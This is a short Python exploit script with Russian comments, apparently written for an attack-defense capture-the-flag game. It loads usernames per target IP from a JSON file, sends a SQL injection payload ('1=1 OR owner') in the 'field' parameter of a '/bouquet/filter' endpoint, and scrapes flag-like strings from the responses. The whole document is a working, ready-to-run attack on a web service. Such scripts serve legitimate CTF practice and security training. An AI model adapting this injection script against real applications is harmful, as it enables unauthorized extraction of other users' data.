#!/usr/bin/env python3
import sys
import json
import re
import urllib.request
import urllib.parse

# ————— Настройки —————
JSON_CFG = 'bouqute.json'               # Ваш файл с ip→списками
FLAG_REGEX = r'[A-Za-z0-9]{10,}='       # Совпадения флагов (пример)
INJ_FIELD  = '1=1 OR owner'             # SQL-инъекция в field

def load_usernames(cfg_path, ip):
    """
    Из bouqute.json берём секцию 'bouquets',
    десериализуем каждую строку и возвращаем список
    юзеров с location == "bouquet_description".
    """
    with open(cfg_path, encoding='utf-8') as f:
        cfg = json.load(f)
    raw_list = cfg.get('bouquets', {}).get(ip, [])
    users = []
    for raw in raw_list:
        try:
            obj = json.loads(raw)
            if obj.get('location') == 'bouquet_description':
                users.append(obj['username'])
        except json.JSONDecodeError:
            continue
    return users

def exploit(target_url):
    # вытаскиваем IP (ключ в JSON) из URL
    ip = urllib.parse.urlparse(target_url).hostname
    users = load_usernames(JSON_CFG, ip)
    if not users:
        print(f"[!] No targets for {ip}", file=sys.stderr)
        return

    endpoint = target_url.rstrip('/') + '/bouquet/filter'
    for user in users:
        q = {
            'field': INJ_FIELD,
            'value': user
        }
        full = endpoint + '?' + urllib.parse.urlencode(q)
        req = urllib.request.Request(full, headers={
            'User-Agent': 'Mozilla/5.0',
        })
        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                text = resp.read().decode(errors='ignore')
        except Exception as e:
            print(f"[ERROR] {ip} / {user}: {e}", file=sys.stderr)
            continue

        # ищем флаги
        for flag in re.findall(FLAG_REGEX, text):
            # Каждую строку печатаем с flush, чтобы клиент не потерял буфер
            print(flag, flush=True)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f'Usage: {sys.argv[0]} http://<IP>:<PORT>', file=sys.stderr)
        sys.exit(1)

    exploit(sys.argv[1])
